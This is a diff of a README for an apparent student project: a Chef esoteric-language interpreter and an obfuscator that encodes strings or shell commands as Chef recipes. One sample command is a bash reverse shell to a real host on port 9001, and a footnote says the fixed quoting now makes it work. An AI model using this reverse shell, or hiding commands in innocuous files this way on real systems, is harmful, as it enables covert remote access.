@@ -28,7 +28,7 @@ Our final project attempts to create a Chef interpreter in C, and an obfuscator 
 ## Usage
 
 ### To obfuscate: `./obfuscate`
-
+e
 Obfuscate takes a single command flag and a string to encode and outputs a valid Chef file. The two valid flags are
 - `-p`: The Chef file will *print* the string provided.
 - `-x`: The Chef file *execute* the string provided as an `sh`-compatible shell command.
@@ -37,7 +37,7 @@ Sample usage:
 - `./obfuscate -p "Hello, world!"`
 - `./obuscate -p '"Chefs are nutters. They'\''re all self-obsessed, delicate, dainty, insecure little souls, and absolute psychopaths. Every last one of them." - Gordon Ramsay'`
 - `./obfuscate -x 'echo "Hello, world!"'`
-- `./obfuscate -x 'bash -c 'bash -i >& /dev/tcp/149.89.150.100/9001 0>&1''`[^5]
+- `./obfuscate -x "bash -c 'bash -i >& /dev/tcp/149.89.150.100/9001 0>&1'"`[^5]
 
 Watch out! Obfuscate is ONLY guaranteed to work on ASCII input with 256 or fewer distinct characters.[^6] Attempting to use it otherwise will throw an error.
 
@@ -48,7 +48,6 @@ Interpret takes a file path followed by an optional flag and attempts to run it 
 
 Sample usage:
 - `./interpret recipes/factorial.chef`
-- `./interpret download.txt -v`
 - `cat recipes/souffle.chef | ./interpret -`
 - `./obfuscate -p 'wow' | ./interpret - -v`
 
@@ -76,6 +75,6 @@ By including both an obfuscator and interpreter, we gain the ability to encode a
 [^2]: [Mateas, Michael and Nick Montfort. “A Box, Darkly: Obfuscation, Weird Languages, and Code Aesthetics.” In Proceedings of the 6th Digital Arts and Culture Conference, IT University of Copenhagen, 1-3 Dec 2005, pp. 144-153.](https://nickm.com/cis/a_box_darkly.pdf)
 [^3]: At least I assume it's Turing complete. I found [this program by Wesley Janssen, Joost Rijneveld and Mathijs Vos](https://github.com/joostrijneveld/Chef-Interpreter/blob/master/ChefInterpreter/TuringsTastyTortillas.chef) which claims to be a working Turing Machine (and it certainly seems to be) and the fact that I cannot spot any way to solve the halting problem with it certainly seem exciting, but I can find no actual analysis and do not trust my own intuition.
 [^4]: On the other hand, I know for a *fact* that Chef cannot represent all possible recipes, because there is no way to encode my grandmother's skillet chops and rice recipe. The step "Lie about the presence of onions" is unencodable due to the simple fact that Chef requres all instructions involving arbitrary verbs to be loops and have a matching "until *present participle*" command, while the command to lie about the presence of onions can never complete.
-[^5]: That's a reverse shell to homer.stuy.edu on port 9001.
+[^5]: That's a reverse shell to homer.stuy.edu on port 9001. In our video, this command didn't actually work, and that was because the bash command was actually getting executed. By replacing the single quotes with double quotes, it's actually running as it's supposed to and generating the reverse shell recipe.
 [^6]: It shouldn't be possible to use more than 256 distinct characters while staying in the 7-bit ASCII range, but you never know.
 [^7]: It's not our problem, essentially.
